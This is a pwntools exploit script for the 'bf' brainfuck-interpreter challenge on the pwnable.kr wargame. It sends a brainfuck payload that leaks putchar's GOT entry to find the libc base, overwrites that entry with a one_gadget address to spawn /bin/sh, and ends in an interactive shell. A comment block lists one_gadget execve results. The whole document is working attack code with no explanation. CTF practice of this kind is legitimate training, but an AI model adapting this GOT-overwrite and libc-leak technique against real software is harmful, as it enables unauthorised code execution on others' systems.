#coding:utf-8
from pwn import *

context.log_level = 'debug'
elf = ELF("./bf")
libc = ELF("./bf_libc.so")

tape_bss = 0x0804A0A0
putchar_addr = 0x0804A030
putchar_libc_offset = libc.symbols['putchar']

def mov_back(n):
    return '<'*n

def intput_overwrite(n):
    return ',>'*n

def read(n):
    return '.>'*n

def call_putchar():
    return '.'

payload = call_putchar()
payload += mov_back(tape_bss - putchar_addr)
payload += read(0x4)
payload += mov_back(0x4) + intput_overwrite(0x4)
payload += call_putchar()

p = remote('pwnable.kr',9001)
p.recvuntil('except [ ]\n')
p.sendline(payload)

p.recv(1)
putchar_addr_real = u32(p.recv(4))
offset = putchar_addr_real - putchar_libc_offset
p.send(p32(offset + 0x5fbc5))               # from one_gadget bf_libc.so
# p.send(p32(offset + 0x5fbc6))
'''
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''

p.interactive()